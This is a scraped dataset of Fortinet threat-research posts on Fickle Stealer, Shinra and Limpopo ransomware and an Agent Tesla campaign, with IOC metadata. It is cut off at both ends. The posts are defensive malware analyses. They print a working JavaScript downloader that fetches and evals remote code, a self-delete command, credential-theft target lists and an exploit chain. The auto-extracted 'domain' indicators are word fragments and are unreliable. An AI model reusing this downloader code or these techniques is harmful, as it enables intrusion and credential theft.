searches log files and ldb files in the Local Storage/leveldb subfolder. The title is “discord_dblist.txt” discordGoogle/Chrome/User Data/DefaultYandex/YandexBrowser/User Data/DefaultMicrosoft/Edge/User Data/DefaultBraveSoftware/Brave-Browser/User Data/DefaultGoogle/Chrome SxS/User DataGoogle/Chrome/User Data/Profile 1Google/Chrome/User Data/Profile 2Google/Chrome/User Data/Profile 3Google/Chrome/User Data/Profile 4Google/Chrome/User Data/Profile 5Google/Chrome/User Data/Profile 6Google/Chrome/User Data/Profile 7Google/Chrome/User Data/Profile 8Google/Chrome/User Data/Profile 9discordcanaryLightcorddiscordptbOpera Software/Opera StableOpera Software/Opera GX StableAmigo/User DataTorch/User DataKometa/User DataOrbitum/User DataCentBrowser/User Data7Star/7Star/User DataSputnik/Sputnik/User DataVivaldi/User Data/DefaultEpic Privacy Browser/User DatauCozMedia/Uran/User Data/DefaultIridium/User Data/Default Additionally, some applications are targets by default. Below are those targets and the way data is processed: Applications Sends files in specified folder to the server. Most often, the tag is the application name in lower case appended by two colons: Anydesk, Ubisoft (tag:uplay::), Steam, Skype, Signal, ICQ, Filezilla, Telegram, Tox, Pidgin, Element Gecko engine browser Searches %APPDATA%, %LOCALAPPDATA% or %USERPROFILE% for these files: logins.json key4.db, keydb (tag: geckologins::) and cookies.sqlite (tag: geckocookies::) If found, it copies the file to the Temp folder, sends a copy to the server, and deletes the copy. Chromium based browser Searches “os_crypt\" and \"encrypted_key” in the Local state file to get a decryption key. It parses data in Cookies, History, WebData, and Login Data files to obtain sensitive data and sends a summarized result to the server. These files are also copied to the Temp folder before Fickle Stealer reads them. They are later deleted. The title is browser and the data is stored in JSON format. Finally, it sends a screenshot to the server and deletes itself by executing the following command: cmd.exe /c timeout /t 5 & del /f /q {stealer} && exit In addition to some popular applications, this stealer searches sensitive files in parent directories of common installation directories to ensure comprehensive data gathering. It also receives a target list from the server, which makes Fickle Stealer more flexible. Variants receiving an updated list are observed. The frequently updated attack chain also shows that it’s still in development. FortiGuard will continue monitoring malware variants and provide appropriate protections as needed. The malware described in this report is detected and blocked by FortiGuard Antivirus as: W32/InfoStealer.599C!tr VBA/TrojanDownloader. BED9!tr PowerShell/TrojanDownloader. AE38!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. To stay informed and proactively defend against attacks like Fickle Stealer, sign up to receiveOutbreak Alertsfrom Fortinet. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 144[.]208[.]127[.]230 185[.]213[.]208[.]245 138[.]124[.]184[.]210 hxxps:// github[.]com/SkorikJR 1b48ee91e58f319a27f29d4f3bb62e62cac34779ddc3b95a0127e67f2e141e59 ad57cc0508d3550caa65fcb9ee349c4578610970c57a26b7a07a8be4c8b9bed9 8e87ab1bb9870de9de4a7b409ec9baf8cae11deec49a8b7a5f73d0f34bea7e6f 9ffc6a74b88b66dd269d006dec91b8b53d51afd516fe2326c6f9e3ed81d860ae 48e2b9a7b8027bd03ceb611bbfe48a8a09ec6657dd5f2385fc7a75849bb14db1 6f9f65c2a568ca65326b966bcf8d5b7bfb5d8ddea7c258f58b013bc5e079308b 2236ffcf2856d5c9c2dedf180654cf318596614be450f6b24621dc13d7370dbf 8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316 3ad1c2273ee77845117c0f7f55bf0050b0bcea52851d410520a694252b7bb187 7034d351ce835d4905064d2b3f14adb605374a4a6885c23390db9eddd42add86 c6c6304fea3fd6f906e45544b2e5119c24cda295142ed9fafd2ec320f5ff41cc 97e5ac8642f413ba4b272d3cb74cba3e890b7a3f7a7935e6ca58944dbb9bfe54 011992cfa6abaeb71d0bb6fc05f1b5623b5e710c8c711bca961bf99d0e4cae38 5fbd700bd77d3f632ba6ce148281c74a20391a40c7984f108f63a20dc442f8d6 d9dcae235891f206d1baabfcbd79cb80337b5e462adef9516b94efc696b596b7 679e9ba645e17cceeff14be7f5f7dff8582d68eba5712c5928a092e1eec55c84 4d78793719d14f92f5bb9ecc7c2fa9e51c1bf332de26aa7746f35d7e42362db8 d55611fce7fcdd6b49066b194196577ee12bffa98400b724d013fc3a1e254f34 346e18b7ce2e3c3c5412dacdc8034a7566dee12ea0aafc6b82f196dcba2453f8 20e1d7af698e3e2f5092815be1a0415019511da99550fdcc050741f4b47551fa f71069aed94e4b13d70bd9ee7b2a8fc8580c4339aa9ba9d8baf15abf95d6f673 94ee2227696da3049ff67592834b4b6f98186f91e6d1cd1eeec44f24b9df754b 24e44d000a61de06b63b532ef237d9f41aa897f4d9f46f8abaf9e654074a65af a04677fe4ba06b66f698e4969b749174d30477283d97b5eaee16ffeb305d9c0a 7b9e09227b036428a41dd46b6d6e354bb0c3822ce201c1a14d083116916e078d 0494077ac65aa278680002f3b73c61c8896303668c62139a9db5a042923fd0ce 47e4142fa6ab10a2d7dc0423d41f9bdbb3ced0f4fae5c58b673386d11dd8c973 46caee016da4b460f7c242e19a88e8dc7544ded7d2528b0b9e918a7be64b5ceb b05736874d383ed2e8dcc9d392f2c04e0fd545b8880620499d720c44adb18822 bf8b8f964d1c67aee82ad01528423077ef5e6c65de6d95e446c9343868849350 4602d8f9e2150744e89958d813354696abe6800ee55ef70c48db3134e964a13a 70363b97f955e5d30fb8d3a8d2a439303f88707420c05f051f87e0458fdfffc2 62ff72aa8a8c5bccdf6c789952ee054a0d0d479e417fa20ea73a936e17bdf043 5f24168581cdaef32e60a62ba7123917bbe65f2f8410d759f345587eb406be40 effb85aaef61cd8918d66513da1573365be2743ec263be4029a6b827e3ecc1c6 b57caa40f680d468bbf811e798ef9881d6158fb3462dd9bedb4658d17aed44a5 26fa0ccc5c7b7733ee6ffc2c70edef067b6764387ef1b16cb8005f28c34a3d84 f080d7803ce1a1b9dc72da6ddf0dd17e23eb8227c497f09aa7dfd6f3b5be3a66 93db0d88966519e76db4995a3b67ca548e4aa9675806295a790eedf585e0aa2f 9f7591c9d9bc66029e6a341a4fb8828361fc14b1918f9e35506c608359fa1eec e9bc44cf548a70e7285499209973faf44b7374dece1413dfcdc03bf25a6c599c a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53 9ce52929765433ff8bf905764d7b83c4c3fcbefb4f12eabcf16ee3dddcd3759d b7bdb0cc90b11c4738c2af218a1a53e4c65b6c91c6067c224164b8fcfc3eed8c f878a88b7dda1155fe939abe0500e32d5fba34569ca933bccb5603d9e0e96cc0 bfe2d817e20ecff45cc92b7b8f4e1cd0482b48a769940402eaa5b31cbfb9b908 09b47fd0e1fcab827d1a723f9db7e402502ec91e57b7217ed85094abd98bc637 978400108aa16e464b1fbc300bc270bc89193e3c3890d5e9373b3034b592b4da e394f96ee040508063606343b1ad2158e266dcbd8beb3ba4a23936d1957e5ad6 Info stealer,infostealer,info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fickle-stealer-distributed-via-multiple-attack-chain",
      "scraped_at": "2025-07-20T13:47:29.349541",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ogins",
          "allet",
          "ey4",
          "orfiles",
          "ookies",
          "md",
          "ystem",
          "miMgmt"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "a641d10798be5224c8c32dfaab0dd353cd7bb06a2d57d9630e13fb1975d03a53",
          "679e9ba645e17cceeff14be7f5f7dff8582d68eba5712c5928a092e1eec55c84",
          "e9bc44cf548a70e7285499209973faf44b7374dece1413dfcdc03bf25a6c599c",
          "47e4142fa6ab10a2d7dc0423d41f9bdbb3ced0f4fae5c58b673386d11dd8c973",
          "62ff72aa8a8c5bccdf6c789952ee054a0d0d479e417fa20ea73a936e17bdf043",
          "346e18b7ce2e3c3c5412dacdc8034a7566dee12ea0aafc6b82f196dcba2453f8",
          "4602d8f9e2150744e89958d813354696abe6800ee55ef70c48db3134e964a13a",
          "f080d7803ce1a1b9dc72da6ddf0dd17e23eb8227c497f09aa7dfd6f3b5be3a66",
          "7b9e09227b036428a41dd46b6d6e354bb0c3822ce201c1a14d083116916e078d",
          "bf8b8f964d1c67aee82ad01528423077ef5e6c65de6d95e446c9343868849350",
          "4d78793719d14f92f5bb9ecc7c2fa9e51c1bf332de26aa7746f35d7e42362db8",
          "a04677fe4ba06b66f698e4969b749174d30477283d97b5eaee16ffeb305d9c0a",
          "c6c6304fea3fd6f906e45544b2e5119c24cda295142ed9fafd2ec320f5ff41cc",
          "d55611fce7fcdd6b49066b194196577ee12bffa98400b724d013fc3a1e254f34",
          "6f9f65c2a568ca65326b966bcf8d5b7bfb5d8ddea7c258f58b013bc5e079308b",
          "24e44d000a61de06b63b532ef237d9f41aa897f4d9f46f8abaf9e654074a65af",
          "ad57cc0508d3550caa65fcb9ee349c4578610970c57a26b7a07a8be4c8b9bed9",
          "f878a88b7dda1155fe939abe0500e32d5fba34569ca933bccb5603d9e0e96cc0",
          "48e2b9a7b8027bd03ceb611bbfe48a8a09ec6657dd5f2385fc7a75849bb14db1",
          "20e1d7af698e3e2f5092815be1a0415019511da99550fdcc050741f4b47551fa",
          "b7bdb0cc90b11c4738c2af218a1a53e4c65b6c91c6067c224164b8fcfc3eed8c",
          "1b48ee91e58f319a27f29d4f3bb62e62cac34779ddc3b95a0127e67f2e141e59",
          "09b47fd0e1fcab827d1a723f9db7e402502ec91e57b7217ed85094abd98bc637",
          "70363b97f955e5d30fb8d3a8d2a439303f88707420c05f051f87e0458fdfffc2",
          "effb85aaef61cd8918d66513da1573365be2743ec263be4029a6b827e3ecc1c6",
          "8e87ab1bb9870de9de4a7b409ec9baf8cae11deec49a8b7a5f73d0f34bea7e6f",
          "3ad1c2273ee77845117c0f7f55bf0050b0bcea52851d410520a694252b7bb187",
          "011992cfa6abaeb71d0bb6fc05f1b5623b5e710c8c711bca961bf99d0e4cae38",
          "9ce52929765433ff8bf905764d7b83c4c3fcbefb4f12eabcf16ee3dddcd3759d",
          "0494077ac65aa278680002f3b73c61c8896303668c62139a9db5a042923fd0ce",
          "5f24168581cdaef32e60a62ba7123917bbe65f2f8410d759f345587eb406be40",
          "26fa0ccc5c7b7733ee6ffc2c70edef067b6764387ef1b16cb8005f28c34a3d84",
          "5fbd700bd77d3f632ba6ce148281c74a20391a40c7984f108f63a20dc442f8d6",
          "8d3ccfafc39830ee2325170e60a44eca4a24c9c4dd682a84fa60c961a0712316",
          "97e5ac8642f413ba4b272d3cb74cba3e890b7a3f7a7935e6ca58944dbb9bfe54",
          "9f7591c9d9bc66029e6a341a4fb8828361fc14b1918f9e35506c608359fa1eec",
          "e394f96ee040508063606343b1ad2158e266dcbd8beb3ba4a23936d1957e5ad6",
          "f71069aed94e4b13d70bd9ee7b2a8fc8580c4339aa9ba9d8baf15abf95d6f673",
          "94ee2227696da3049ff67592834b4b6f98186f91e6d1cd1eeec44f24b9df754b",
          "d9dcae235891f206d1baabfcbd79cb80337b5e462adef9516b94efc696b596b7",
          "9ffc6a74b88b66dd269d006dec91b8b53d51afd516fe2326c6f9e3ed81d860ae",
          "2236ffcf2856d5c9c2dedf180654cf318596614be450f6b24621dc13d7370dbf",
          "978400108aa16e464b1fbc300bc270bc89193e3c3890d5e9373b3034b592b4da",
          "93db0d88966519e76db4995a3b67ca548e4aa9675806295a790eedf585e0aa2f",
          "7034d351ce835d4905064d2b3f14adb605374a4a6885c23390db9eddd42add86",
          "bfe2d817e20ecff45cc92b7b8f4e1cd0482b48a769940402eaa5b31cbfb9b908",
          "b05736874d383ed2e8dcc9d392f2c04e0fd545b8880620499d720c44adb18822",
          "b57caa40f680d468bbf811e798ef9881d6158fb3462dd9bedb4658d17aed44a5",
          "46caee016da4b460f7c242e19a88e8dc7544ded7d2528b0b9e918a7be64b5ceb"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7075471698113208
    }
  },
  {
    "id": "Fortinet_5500",
    "source": "Fortinet",
    "title": "Ransomware Roundup – Shinra and Limpopo Ransomware",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Shinra and Limpopo ransomware. Affected platforms:Microsoft Windows, VMWare ESXiImpacted parties:Microsoft Windows and VMWare ESXi UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High The Shinra ransomware was first submitted to a publicly available file-scanning service in April 2024. The threat actor steals victims' data before deploying and running its ransomware malware to encrypt files. The ransomware is also designed to delete Volume Shadow Copies to inhibit system recovery. Since threat actors sometimes use the names of subcultural characters and organizations, we wondered if Shinra was borrowed from the criminal corporation in the Final Fantasy 7 game, but unfortunately, we found no such evidence. Information on the infection vector used by the Shinra ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. The Shinra ransomware samples were submitted to a publicly available file scanning service from Israel, Poland, Russia, the United Kingdom, and the United States. One of the Shinra ransomware samples (SHA2: 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7) performs the following actions: The Shinra ransomware sample copies itself to the current user's startup folder in the start menu as <ID>.exe, where <ID> is 32 hex characters. It then terminates processes whose names contain any of the following strings: wxServerView ZhuDongFangYu AutodeskDesktopApp acwebbrowser Creative Cloud Adobe Desktop Service AdobeIPCBroker sync-taskbar sync-worker InputPersonalization AdobeCollabSync SimplyConnectionManager Simply. SystemTrayIcon wsa_service koaly-exp-engine-se It also terminates services whose names contain any of the following strings: QBIDPService Intuit. QuickBooks. FCS QBCFMonitorService zhudongfangyu vmware-usbarbitator64 vmware-converter MSSQL$MICROSOFT##WID MSSQL$VEEAMSQL2012 SQLAgent$VEEAMSQL2012 FishbowlMySQL MSSQL$MICROSOFT##WID MSSQL$KAV_CS_ADMIN_KIT MSSQLServerADHelper100 SQLAgent$KAV_CS_ADMIN_KIT msftesql-Exchange MSSQL$MICROSOFT##SSEE MSSQL$SBSMONITORING The Shinra ransomware replaces the desktop wallpaper by changing the following registry setting: The ransomware sets the following registry keys: It also uses wevtutil.exe to enumerate and clear Windows logs. The ransomware does not encrypt files with the following extensions: The ransomware does not encrypt files in directories containing the following strings: $Windows.~bt $recycle.bin Windows photo viewer internet explorer System volume information Windows.old application data Windows defender Windows security Windowspowershell Windows journal microsoft shared common files $Windows.~ws microsoft.net It avoids encrypting the following files: bootsect.bak autorun.inf iconcache.db Oddly enough, the Shinra ransomware also includes a different list of file extensions, but we could not find any code using this list. It’s possible that the list is for future development or leftover code that wasn’t removed. The list contains the following extensions: The Shinra ransomware uses COM to run the following commands to delete shadow copies, making file recovery difficult: It then appends “.[ethan@[removed].info]. SHINRA2” to the infected files. Other Shinra ransomware variants add different file extensions, such as \". SHINRA3,\" \". SHINRA7,\" and \". SHINRA9\" instead of \". SHINRA2.\" Also, some of the samples change the file icon of the encrypted files, as seen in this screenshot: The ransomware executes the following command to change the \"boot status policy\" settings so that Windows starts normally regardless of any boot errors: It also executes the following command, which disables the recovery and repair functions of Windows: The ransomware then restarts itself using \"runas admin\" to ensure that it is running with administrator privileges. The malware also checks to make sure it’s running inside a targeted operating system by: The ransomware silently empties the Recycle Bin without user confirmation, progress bar, or sound. Finally, it drops a ransom note, which demands victims to contact the attacker via email: In March of this year, FortiGuard Labs received an inquiry from an Asian law enforcement agency about ransomware named “Socotra” due to its impact in that region. While no sample of the Socorta ransomware has surfaced to date, we were able to trace it back to another ransomware, Limpopo, which was submitted to a publicly available file scanning service in February 2024 that targets ESXi environments. Information on the infection vector used by the Limpopo ransomware threat actor is unavailable. Given thatBushidoToken's tweetreported that this malware is affecting Latin America and Thailand, in addition to the previous inquiry about Socorta ransomware from Asia, it is not hard to imagine that they are spreading the ransomware widely in some way, such as through Trojanized software or by exploiting vulnerabilities. Based on the locations from which ransom notes likely used by the Limpopo ransomware family were submitted to the publicly available scanning service, the countries of Chile, Guatemala, Honduras, India, Italy, Mexico, Peru, Spain, Thailand, the United States, and Vietnam were potentially affected. The Limpopo ransomware is not complex. Once executed, the Limpopo ransomware encrypts files with the following extensions: Once files have been encrypted, a “. LIMPOPO” extension is added to the filename. Files with this extension are skipped and effectively whitelisted. It then drops the following ransom note: Hi. We have your data. If you don't cooperate it will be made public. Go to hxxps://getsession[.]org/ Downloadinstall then add [removed] mention this code LIMPOPO in your messageget in touch with us No other samples of the Limpopo ransomware were found, but we found similar ransom notes that may have been used by ransomware variants. For example, the Socorta ransomware, a potential Limpopo variant, drops the following ransom note: Go to hxxps://getsession[.]org/ Downloadinstall then add [Removed] to your contacts and send a message with this codename -- SOCOTRA Although no actual malware samples are available, other possible Limpopo ransomware variants include Akgum, Aktakyr, Bulanyk, Formosa, Hatartam, Monjukly, Sakgar, Sazanda, and Windows ransomware. While unverified, thetweetbelow claims that the Socotra ransomware exploits CVE-2024-22252 and CVE-2024-22253 (CVE-20204-22252 and CVE-20204-22253 may be a typo) that affect VMware ESXi, Workstation, and Fusion, which were patched in March 2024. English translation: In the case of cve 20204-22252, cve-20204-22253, be sure to patch it because it will destroy your Eid holiday. The Shinra and Limpopo ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of those solutions. As a result, customers with up-to-date versions of these products installed are protected. Shinra Ransomware File IOCs 31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7 Shinra ransomware d60d4624425b2f58dd9e37c40046f776e0d78cb031488a12c435239dd0da40ef 941a95c85a4b37bff4571d49eb918a5094a032ac1416bded3a3cd3427ecf984c 399d586f033ec625a1f7524c86a1483808ff07e920f93e82e70cc5138feee72e Limpopo Ransomware File IOCs 031971b9ccb57c1a7cf25bbd58533a6b1b1e760b2f080cb2be5e2522c0d90053 Limpopo ransomware 58ba94be5c2c7d740b6192fea1cc829756da955bb0f2fcf478ab8355bf33a31a Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts that provides unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-shinra-and-limpopo-ransomware",
      "scraped_at": "2025-07-20T13:47:38.575739",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ootsect",
          "ecycle",
          "utorun",
          "evtutil",
          "indows",
          "concache",
          "icrosoft"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "31eec61ed6866e0b4b3d6b26a3a7d65fed040df61062dd468a1f5be8cc709de7",
          "031971b9ccb57c1a7cf25bbd58533a6b1b1e760b2f080cb2be5e2522c0d90053",
          "941a95c85a4b37bff4571d49eb918a5094a032ac1416bded3a3cd3427ecf984c",
          "d60d4624425b2f58dd9e37c40046f776e0d78cb031488a12c435239dd0da40ef",
          "58ba94be5c2c7d740b6192fea1cc829756da955bb0f2fcf478ab8355bf33a31a",
          "399d586f033ec625a1f7524c86a1483808ff07e920f93e82e70cc5138feee72e"
        ],
        "cve": [
          "CVE-2024-22253",
          "CVE-2024-22252"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.6792452830188681
    }
  },
  {
    "id": "Fortinet_30473",
    "source": "Fortinet",
    "title": "New Agent Tesla Campaign Targeting Spanish-Speaking People",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity Level:Critical A new phishing campaign was recently captured by our FortiGuard Labs that spreads a new Agent Tesla variant targeting Spanish-speaking people. Security researchers have detected Agent Tesla campaigns from time to time for years. Agent Tesla is a well-known . Net-based Remote Access Trojan (RAT) designed to stealthily infiltrate victim’s computers and steal their sensitive information, such as their computer’s hardware information, login user information, keystrokes, email contacts, web browser cookies files, system clipboard data, screenshots, and basic information like login user name, computer name, OS information, CPU and RAM information, as well as saved credentials in widely installed software. In-depth research on this campaign shows that it also leverages multiple techniques to deliver the Agent Tesla core module, such as using known MS Office vulnerabilities, JavaScript code, PowerShell code, fileless modules, and more, to protect itself from being analyzed by security researchers. In this analysis, I will elaborate on how the campaign works to load Agent Tesla onto a victim’s computer, how it starts, what sensitive data it is able to collect, and the way it sends stolen data to the attacker. As you can see from the above screenshot, the phishing email was written in Spanish. The message translated into English reads as: Attached is proof of payment made to your account according to your client's instructions. The phishing email looks like a standard SWIFT transfer notification from a large financial institution with a disguised Excel attachment (transferencia_swift_87647574684.xla) to the victim, as shown in Figure 1. As you may have noticed, the FortiClient service marked the phishing email with “[virus detected]” to warn the user about the attached Excel document. The Excel document is in OLE format with crafted embedded data that exploits theCVE-2017-0199vulnerability. It contains an embedded OLE hyperlink, which is opened automatically once the Excel document is started by the victim. The provided hyperlink in the document is “hxxp[:]//ilang[.]in/QqBbmc”, as shown in Figure 2. Once the victim opens the Excel file, it automatically downloads an RTF document, which the Word program then calls to open. Figure 3 shows the traffic and how the URL downloads the RTF document. CVE-2017-11882is an RCE (Remote Code Execution) vulnerability in Microsoft Office’s Equation Editor component (EQNED32. EXE). It can be exploited by Excel, Word, PowerPoint, and RTF documents as long as they contain crafted equation data in an OLE object. Successfully exploiting this vulnerability allows an attacker to execute arbitrary code on a victim's computer. This buffer overflow vulnerability overrides a return address in the stack of EQNED32. EXE. It can then hijack the process to jump to and execute the malicious code copied in the stack. Figure 4 shows the crafted equation data extracted from the downloaded RTF document. The data marked in red is a constant address of EQNED32. EXE that will override a return address in the stack when a buffer overflow occurs. Once the shellcode is executed, it downloads a JavaScript code from a website and executes it on the victim’s computer. In Figure 5, the shellcode was about to call an API, URLDownloadToFileW(), to download the JavaScript file from “hxxp[:]//equalizerrr[.]duckdns.org/eveningdatingforeveryone.js” to the local file “C:\\Users\\Bobs\\AppData\\Roaming\\morningdatingroses.js.” It then calls the API ShellExecuteW() to execute the JavaScript file (the Windows program WScript.exe is called to execute the JS file). Finally, it exits the process by calling the API ExitProcess(). Below is a code snippet of the JavaScript file. It is very clear that it continues to download another file from “hxxps[:]//paste[.]ee/d/yWWXG.” This JavaScript file is executed after calling the eval() function. morningdatingroses.js: var paparicos = new ActiveXObject(\"MSXML2. XMLHTTP\");var alijar = \"GXWWy/d/ee.etsap//:sptth\".split(\"\").reverse().join(\"\");paparicos.open(\"GET\", alijar, false);paparicos.send(); var vomitar = \"\";if (paparicos.status === 200) {vomitar= paparicos.responseText;} function estarostia(piguancha) {eval(piguancha);} estarostia(vomitar); When opening the URL in a web browser, it looks like normal JavaScript code, but it contains a piece of malicious code with base64-encoded PowerShell code. This code will be decoded and combined with other code (shown below) and executed inside a “powershell.exe” process, as you can see in Figure 6. The PowerShell code’s purpose includes: Please refer to Figure 7 for more information about the PowerShell code. The loader-module is a kind of fileless module that is never saved in the local folder. This makes it difficult for a researcher to notice the file unless performing a step-by-step, in-depth analysis. The first argument to the method VAI() is a reversed URL to the Agent Tesla core module, which is “hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt.” The second argument is a switch. If it’s “1,” it will establish persistence on the victim’s computer by adding itself to the auto-run group in the system’s registry. In this case, it’s \"desativado,” so it won’t establish. The penultimate argument is a process name, which for this variant is “AddInProcess32.” The loader-module running in a PowerShell process downloads a file from the URL passed by the first argument and keeps it in the memory. This is the Agent Tesla core module, as shown in Figure 8. Afterward, it initiates the 'AddInProcess32' process in a suspended state by calling the API CreateProcessA() with the creation flags of 0x80000004 (CREATE_SUSPENDED). Next, the loader-module performs process hollowing on the process that it copies the Agent Tesla executable into and executes it within the “AddInProcess32.exe” process. To do this, it calls APIs, such as GetThreadContext(), VirtualAllocEx(), WriteProcessMemory(), SetThreadContext(), and ResumeThread(). Figure 9 shows the process tree outlining the complete picture, starting from the Excel document and ending with Agent Tesla running inside “AddInProcess32.exe.” This variant of Agent Tesla is a 32-bit . Net framework program is being obfuscated as a fileless module. Figure 10 shows a debugger that breaks Agent Tesla at the EntryPoint method, where the namespaces, classes, methods, and code flow are all obfuscated. A special method aims to detect whether it is running in an analysis environment. It performs the following detections: Once any of the above detections’ results are ‘true,’ it exits the process. In this section, I will review Agent Tesla’s features, such as how this variant collects credentials and email contacts from the victim’s device, the software from which it collects the data, and the basic information of the victim’s device. It steals saved credentials from some web browsers, classified as Chromium-based and Mozilla-based, because they use the same folder structure and files to save the credentials. It reads saved credentials from “Login Data” files under their browsers’ profile folder for Chromium-based browsers. Figure 11 shows that it had just obtained some “Opera Browser” (Chromium-based browser) credentials from its profile files “{browser’s profile path}\\Default\\Login Data” and “{browser’s profile path}\\Login Data.” Figure 12 shows it has just obtained credentials from a Firefox browser’s profile. This variant will steal credentials from the following web browser list. Chromium-based Web Browsers \"Orbitum,\" \"Elements Browser,\" \"Cool Novo,\" \"Sputnik,\" \"360 Browser,\" \"Uran,\" \"Iridium Browser,\" \"Liebao Browser,\" \"Vivaldi,\" \"Chromium,\" \"Sleipnir 6,\" \"Coowon,\" \"Coccoc,\" \"Amigo,\" \"Chedot,\" \"Epic Privacy,\" \"CentBrowser,\" \"Edge Chromium,\" \"Chrome,\" \"Citrio,\" \"Opera Browser,\" \"QIP Surf,\" \"Brave,\" \"Kometa,\" \"Comodo Dragon,\" \"7Star,\" \"Torch Browser,\" \"Yandex Browser.\" Mozilla-based Web Browsers \"Firefox, \"CyberFox, \"WaterFox, \"K-Meleon, \"Postbox, \"Thunderbird browser, \"IceCat, \"Flock, \"IceDragon, \"BlackHawk, \"PaleMoon,\" and \"SeaMonkey.” Other than the above web browsers, Agent Tesla continues to look for more saved credentials from a wide range of software, which I have categorized below. Other Web Browsers: \"Falkon Browser,\" \"Flock Browser,\" \"IE/Edge,\" \"QQ Browser,\" \"Safari for Windows,\" and \"UC Browser.” Email clients: \"Outlook, \"Opera Mail, \"PocoMail, \"The Bat!\", \"Becky!\", \"ClawsMail, \"FoxMail, \"IncrediMail, \"eM Client, \"Mailbird, \"Eudora,\" and \"Windows Mail App.\" FTP clients: \"CoreFTP,\" \"Flash FXP,\" \"FTPGetter,\" \"FTP Navigator,\" \"FileZilla,\" \"SmartFTP,\" \"FtpCommander,\" \"WinSCP,\" and \"WS_FTP.\" VPN clients: \"NordVPN,\" \"TightVNC,\" \"RealVNC,\" \"UltraVNC,\" \"OpenVPN,\" and \"Private Internet Access.\" \"Discord,\" \"Pidgin,\" \"Trillian,\" \"Psi/Psi+,\" and \"Paltalk.\" \"MysqlWorkbench,\" \"DynDns,\" \"Microsoft Credentials,\" \"Internet Downloader Manager,\" and \"JDownloader.” Agent Tesla can also collect the victim’s email contacts if they use Thunderbird as their email client. Inside global-messages-db.sqlite, under the Thunderbird profile folder, there is a file named 